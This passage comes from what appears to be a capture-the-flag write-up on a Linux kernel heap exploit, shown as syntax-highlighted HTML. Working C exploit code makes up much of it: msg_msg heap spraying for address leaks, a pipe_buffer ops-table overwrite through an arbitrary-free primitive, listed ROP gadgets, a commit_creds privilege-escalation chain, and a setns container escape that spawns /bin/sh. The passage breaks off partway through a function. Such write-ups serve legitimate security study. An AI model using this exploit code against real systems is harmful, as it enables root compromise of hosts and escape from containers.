    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; H_SPRAY; i++) 
    {
        get_msg(targets[i], recieved, size, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> j = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x202</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; j &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x202</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> + (</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1960</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-0x1010</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) / </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">8</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; j++)
        {
            </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *dump = (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *)recieved;
            </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (dump[j] == </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x2</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> &amp;&amp; dump[j+</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] == </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x10</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> &amp;&amp; dump[j+</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">4</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] == dump[j+</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">5</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">])
            {
                kmalloc_1024 = dump[j</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-2</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">];
                kmalloc_512 = dump[j</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">];

                </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// delete chunk 1024, chunk 512 already has sprayed pivots</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
                </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint8_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> target_idx = (dump[j+</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">4</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] &amp; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xff</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

                get_msg(linked_msg[target_idx], recieved, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x400</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">3</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, IPC_NOWAIT | MSG_NOERROR);

                </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// spray to replace with pipe_buffer, thanks LIFO!</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> k = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; k &lt; PIPES; k++)
                {
                    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (pipe(pipefd[k]) &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)
                    {
                        perror(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"pipe failed"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
                        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">exit</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
                    }
                    write(pipefd[k][</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">], </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"pwnage"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">7</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
                }
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">break</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
            }
        }
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (kmalloc_1024 != </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)
        {
            </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">break</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
        }
    }
    close(fd);

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (!kmalloc_1024)
    {
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[X] No leaks, trying again"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        stuff_4k(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">16</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> leaks;
    }
    leaks.kmalloc_1024_leak = kmalloc_1024;
    leaks.kmalloc_512_leak = kmalloc_512;
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> leaks;
}</span></p></div><p>With this information, we can attempt to gain control of the <code>pipe_buffer</code> ops table pointer. </p><p>
</p><p>As I mentioned earlier, my first approach was to perform an unlink attack. In <code>do_msgrcv</code>, the <a href="https://elixir.bootlin.com/linux/v5.7/source/ipc/msg.c#L1153">unlink operation</a>
 occurs when <code>MSG_COPY</code> is not specified. When this occurs, the big 
picture of what occurs is <code>victim-&gt;prev-&gt;next = victim-&gt;next</code> and
 <code>victim-&gt;next-&gt;prev = victim-&gt;prev</code>. If you set up 
<code>victim-&gt;prev</code> to the location of the ops table pointer, and set 
<code>victim-&gt;next</code> to an address in your kmalloc-512 <code>msg_msg</code> data buffer, 
you should be able to change the ops table pointer to point to your 
malicious msg buffer. Basically a classic unlink attack as the diagram 
below shows:</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEicQfNWiB9bQozs2PBDxpXGNps2qnvA69q2PaJ-AfA7scOxGRpSKjQn28AtIGsR-yqjpqAA9eSyWezl79JvMYkyEjNe9iuQNKToKN4gcU0VxBGkRdRP7MZ4le4tOQxhfO8BzIaIMATHkLEH-5A_ZVHjVvGNTr8e7x5B-bT_XLezIgX7GF4Hz8oIZtL7Uw=s1034" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="613" data-original-width="1034" height="380" src="https://blogger.googleusercontent.com/img/a/AVvXsEicQfNWiB9bQozs2PBDxpXGNps2qnvA69q2PaJ-AfA7scOxGRpSKjQn28AtIGsR-yqjpqAA9eSyWezl79JvMYkyEjNe9iuQNKToKN4gcU0VxBGkRdRP7MZ4le4tOQxhfO8BzIaIMATHkLEH-5A_ZVHjVvGNTr8e7x5B-bT_XLezIgX7GF4Hz8oIZtL7Uw=w640-h380" width="640" /></a></div><br /><p>Unfortunately, <code>CONFIG_DEBUG_LIST</code> was enabled. In this case, linked list unlink performs a validity check with this <a href="https://elixir.bootlin.com/linux/v5.7/source/lib/list_debug.c#L38">function</a>.
 Upon failure, it just doesn&#8217;t unlink (but the frees still happen and 
the original pointers get set to the kernel POISON constants).</p><div style="background-color: whitesmoke; display: block; max-width: 100%; overflow-x: auto;"><p><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">bool</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> __list_del_entry_valid(</span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">struct</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> list_head *entry)
{
        </span><span class="hljs-class" style="font-family: monospace; white-space: pre;"><span class="hljs-keyword" style="color: blue;">struct</span> <span class="hljs-title" style="color: #a31515;">list_head</span> *<span class="hljs-title" style="color: #a31515;">prev</span>, *<span class="hljs-title" style="color: #a31515;">next</span>;</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">

        prev = entry-&gt;prev;
        next = entry-&gt;next;

        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (CHECK_DATA_CORRUPTION(next == LIST_POISON1,
                        </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"list_del corruption, %px-&gt;next is LIST_POISON1 (%px)\n"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
                        entry, LIST_POISON1) ||
            CHECK_DATA_CORRUPTION(prev == LIST_POISON2,
                        </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"list_del corruption, %px-&gt;prev is LIST_POISON2 (%px)\n"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
                        entry, LIST_POISON2) ||
            CHECK_DATA_CORRUPTION(prev-&gt;next != entry,
                        </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"list_del corruption. prev-&gt;next should be %px, but was %px\n"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
                        entry, prev-&gt;next) ||
            CHECK_DATA_CORRUPTION(next-&gt;prev != entry,
                        </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"list_del corruption. next-&gt;prev should be %px, but was %px\n"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
                        entry, next-&gt;prev))
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">false</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">true</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

}</span></p></div><p>Glibc heap pwners are all well too familiar with this type of check&#8230; </p><p>Since we have heap leaks, we can overwrite the linked lists so they 
can still dereference upon unlink (even if unlink fails) and then 
  overwrite the <code>next</code> pointers and <code>security</code> pointers to build an arbitrary 
free primitive when chained with <code>do_msgrcv</code>. As the payload must also be 
valid strings, we can only do unaligned frees given the slab heap leaks 
we have. My plan is to just ignore whatever we freed in kmalloc-512 (so I
  will write a misaligned address for the <code>security</code> pointer), and free the
 address at our kmalloc-1k chunk at an offset of -0x20. Now, if we 
manage to allocate a 1k sized <code>msg_msg</code> over this last freed spot, we can 
safely copy in controlled userdata to overwrite the ops pointer to point
 to an address holding our stack pivot gadget, while also not triggering
 hardened usercopy bounds checks. </p><p>The following diagrams should clarify the above strategy.</p><p>


</p><p>The corrupted 4k <code>msg_msg</code> should create this heap scenario:</p><p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEgmV9G9RHasdfwWDKWe7CfePB5HvF1MidXEZaJWGJsvy75sphSeuwI_tVobo56PAk2xebHsAGDLXgPmWmLaw8bRn6SM1k1USHPBa-jEe-Rw_VjJf-k5U-ahumhV1d9TsyrKX0QlQ7fbag8d_Pb4JXXB6dEaZBrOsT8LHrdlHdrlW9vX0Juw5FSb_TBZ4A=s1069" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="688" data-original-width="1069" height="412" src="https://blogger.googleusercontent.com/img/a/AVvXsEgmV9G9RHasdfwWDKWe7CfePB5HvF1MidXEZaJWGJsvy75sphSeuwI_tVobo56PAk2xebHsAGDLXgPmWmLaw8bRn6SM1k1USHPBa-jEe-Rw_VjJf-k5U-ahumhV1d9TsyrKX0QlQ7fbag8d_Pb4JXXB6dEaZBrOsT8LHrdlHdrlW9vX0Juw5FSb_TBZ4A=w640-h412" width="640" /></a></div><br />&nbsp;Then, freeing the 4k <code>msg_msg</code> and spraying some 1k <code>msg_msg</code> to hopefully overlap with the target <code>pipe_buffer</code>:<p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEjnLUr8XN9yLDh8kj0Pc_7H2Oee3c62if_y33BCgkD9fESjzQuVaT8HpEEPhEjh_t7TL5_KB8KL4fCpxYJp_8DBd5tudksGAs_xb6MGehd3Y99AP5HTHerLOqRAyZXBvOxqJXFiCIbYoNFp2SF9GxMkJRQrwgv3bHQCGtMtwFQFUidIyvGR3jj0qzpYQw=s920" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="770" data-original-width="920" height="536" src="https://blogger.googleusercontent.com/img/a/AVvXsEjnLUr8XN9yLDh8kj0Pc_7H2Oee3c62if_y33BCgkD9fESjzQuVaT8HpEEPhEjh_t7TL5_KB8KL4fCpxYJp_8DBd5tudksGAs_xb6MGehd3Y99AP5HTHerLOqRAyZXBvOxqJXFiCIbYoNFp2SF9GxMkJRQrwgv3bHQCGtMtwFQFUidIyvGR3jj0qzpYQw=w640-h536" width="640" /></a></div><br /><p>Closing the target pipefd with close should trigger one of your stack
 pivots due to the overwritten ops table pointer (the release function 
to be specific). At this point, we noticed that none of the registers 
actually pointed to somewhere in kmalloc-512, but all the known 
addresses registers like rax pointed to were at the start of the 
<code>pipe_buffer</code> chunk. This means that the 1k <code>msg_msg</code> chunk we used to 
overwrite the <code>pipe_buffer</code> will also need to contain the ROP chain, and 
our stack pivot needs to replace rsp with rax.</p><p>Scanning for nice gadgets, I came to use the following:</p><p>stack pivot: <code>mov rsp, rax ; pop rbp ; ret;</code></p><p>set rdi: <code>pop rdi ; ret  ;</code></p><p>set rsi: <code>pop rsi ; ret  ;</code></p><p>set rdi from rax: <code>test esi, esi ; cmovne rdi, rax ; mov rax, qword [rdi] ; pop rbp ; ret  ;</code></p><p>The goal of our ROP chain was ultimately to become root in the root 
namespace. I borrowed Andy Nguyen&#8217;s ROP chain strategy to 
<code>commit_cred(prepare_kernel_cred(NULL))</code> and 
<code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code> to achieve 
that goal. After performing those operations, I relied on the kpti 
trampoline from <code>swapgs_and_return_to_userspace</code> to successfully and 
gracefully return back to userland. All that we need to fully escape now
 is to do the classic <a href="https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation"><code>setns</code> tricks</a> in container breakouts.</p><p>






</p><p>The following snippet of code shows what I did to achieve privilege escalation and containerization escape:</p><div style="background-color: whitesmoke; display: block; max-width: 100%; overflow-x: auto;"><p><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">dump_flag</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">()</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
{
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> buf[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">200</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">4194304</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i++) 
    {
        </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// bruteforce root namespace pid equivalent of the other container's sleep process</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">snprintf</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buf, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buf), </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"/proc/%d/root/flag/flag"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, i);
        </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> fd = open(buf, O_RDONLY);
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (fd &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) 
        {
            </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">continue</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
        }
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">""</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        read(fd, buf, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">100</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        write(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, buf, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">100</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">""</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        close(fd);
    }
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
}

__attribute__((naked)) win()
{
    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// thanks movaps sooooooo much</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">asm</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">volatile</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(
        <span class="hljs-string" style="color: #a31515;">"mov rbp, rsp;"</span>
        <span class="hljs-string" style="color: #a31515;">"and rsp, -0xf;"</span>
        <span class="hljs-string" style="color: #a31515;">"call dump_flag;"</span>
        <span class="hljs-string" style="color: #a31515;">"mov rsp, rbp;"</span>
        <span class="hljs-string" style="color: #a31515;">"ret;"</span>)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
}

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">pwned</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">()</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
{
    write(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"ROOOOOOOOOOOT\n"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">14</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    setns(open(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"/proc/1/ns/mnt"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, O_RDONLY), </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    setns(open(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"/proc/1/ns/pid"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, O_RDONLY), </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    setns(open(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"/proc/1/ns/net"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, O_RDONLY), </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    win();
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *args[] = {</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"/bin/sh"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">NULL</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    execve(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"/bin/sh"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, args, </span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">NULL</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    _exit(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
}

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">do_win</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(<span class="hljs-type" style="color: #a31515;">uint64_t</span> kmalloc_512, <span class="hljs-type" style="color: #a31515;">uint64_t</span> kmalloc_1024)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> 
{
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> size = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> target = make_queue(IPC_PRIVATE, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0666</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> | IPC_CREAT);
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> buffer[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x2000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">}, recieved[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x2000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> pat[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x40</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    msg* message = (msg*)buffer;
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memset</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x44</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer));
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> ready = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> ignition_target = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// doesn't matter as long as valid pointers</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> next_target = kmalloc_1024 + </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x440</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> prev_target = kmalloc_512 + </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x440</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// set up arb free primitive, avoid tripping hardened usercopy when re-alloc with msg_msg</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> free_target = kmalloc_1024 - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x20</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> make_sec_happy = kmalloc_512 - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x20</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

